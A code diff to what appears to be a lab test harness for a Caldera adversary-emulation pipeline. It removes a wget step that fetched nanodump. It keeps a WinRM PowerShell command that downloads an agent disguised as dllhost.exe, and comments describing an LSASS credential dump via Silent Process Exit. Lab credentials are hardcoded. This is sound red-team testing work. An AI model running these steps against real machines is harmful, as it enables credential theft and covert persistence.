@@ -226,8 +226,6 @@ async function testFullPipeline() {
   const group = `test-${Date.now()}`
   const taskName = `CalderaSandcat-${group}`
 
-  const kaliPrereq = `if [ -f "\\$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/nanodump.x64.exe" ]; then echo "ALREADY_PRESENT: \\$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/nanodump.x64.exe"; else mkdir -p \\$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads && wget -q "https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe" -O \\$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/nanodump.x64.exe && sudo systemctl restart caldera; fi`
-
   let agentPaw = null
 
   try {
@@ -250,25 +248,8 @@ async function testFullPipeline() {
     } catch {}
     console.log("    => clean")
 
-    // ── Step 2: Install prereqs on Kali ──
-    console.log("\n  [2/6] Running kali prereq (nanodump download + Caldera restart)...")
-    const prereqResult = await sshRun(KALI_IP, "kali", "kali", kaliPrereq)
-    console.log(`    => ${prereqResult.slice(0, 200)}`)
-    if (!prereqResult.includes("ALREADY_PRESENT")) {
-      console.log("    => Caldera was restarted, waiting to come back (120s timeout)...")
-      const start = Date.now()
-      while (Date.now() - start < 120000) {
-        try {
-          await calderaRest("POST", { index: "agents" })
-          console.log(`    => Caldera ready after ${Math.round((Date.now() - start) / 1000)}s`)
-          break
-        } catch {}
-        await new Promise(r => setTimeout(r, 1000))
-      }
-    }
-
-    // ── Step 3: Deploy sandcat via Scheduled Task as SYSTEM ──
-    console.log(`\n  [3/6] Deploying sandcat as SYSTEM (group=${group})...`)
+    // ── Step 2: Deploy sandcat via Scheduled Task as SYSTEM ──
+    console.log(`\n  [2/6] Deploying sandcat as SYSTEM (group=${group})...`)
     const dlResult = await winrmRun(WIN11_IP, "localuser", "password",
       `powershell -Command "$url='http://${KALI_IP}:8888/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file','sandcat.go'); $wc.DownloadFile($url,'C:\\Users\\Public\\dllhost.exe'); Write-Host 'DOWNLOAD_OK'"`)
     console.log(`    => download: ${dlResult.trim()}`)
@@ -458,8 +439,7 @@ async function testFullPipeline() {
 //   - Terminates lsass.exe via NtTerminateProcess; WerFault.exe creates the dump
 //   - lsass.exe automatically restarts on Windows 10/11 (Service Failure Actions)
 //   - Dump output: %temp%\SilentProcessExit\lsass.exe.<PID>.dmp (C:\Windows\Temp\SilentProcessExit\)
-//   - kali_prereq: downloads nanodump.x64.exe from GitHub (fortra/nanodump), restarts Caldera
-//   - win_prereq: none
+//   - win_prereq: downloads nanodump.x64.exe via WinRM
 //   - Command PathToAtomicsFolder replaced with C:\Users\Public\nanodump.x64.exe
 //   - No EULA acceptance needed (unlike ProcDump)
 //   - Agent runs as SYSTEM (Scheduled Task) for SeDebugPrivilege to access LSASS
@@ -491,10 +471,9 @@ async function main() {
   console.log(`\n  Existing building blocks: SSH, WinRM, Caldera REST, Scheduled Task deploy, /plugin/access/exploit`)
   console.log(`  Full pipeline test: agentWait → abilityLookup → payloadDeploy → abilityExploit → dumpVerify → cleanup`)
   console.log(`\n  Silent Process Exit ability specifics:`)
-  console.log(`    - nanodump.x64.exe abuses WerFault.exe via Silent Process Exit registry mechanism`)
-  console.log(`    - Dump file: C:\\Windows\\Temp\\SilentProcessExit\\lsass.exe.<PID>.dmp`)
-  console.log(`    - kali_prereq downloads nanodump from GitHub, restarts Caldera`)
-  console.log(`    - nanodump deployed to C:\\Users\\Public\\ on Windows for direct execution`)
+    console.log(`    - nanodump.x64.exe abuses WerFault.exe via Silent Process Exit registry mechanism`)
+    console.log(`    - Dump file: C:\\Windows\\Temp\\SilentProcessExit\\lsass.exe.<PID>.dmp`)
+    console.log(`    - nanodump deployed to C:\\Users\\Public\\ on Windows via win_prereq (WinRM)`)
   console.log(`    - PathToAtomicsFolder replaced with local binary path (unquoted, unlike Procdump)`)
   console.log(`    - No EULA acceptance needed`)
   console.log(`    - Cleanup removes registry keys to prevent unintended dumps`)
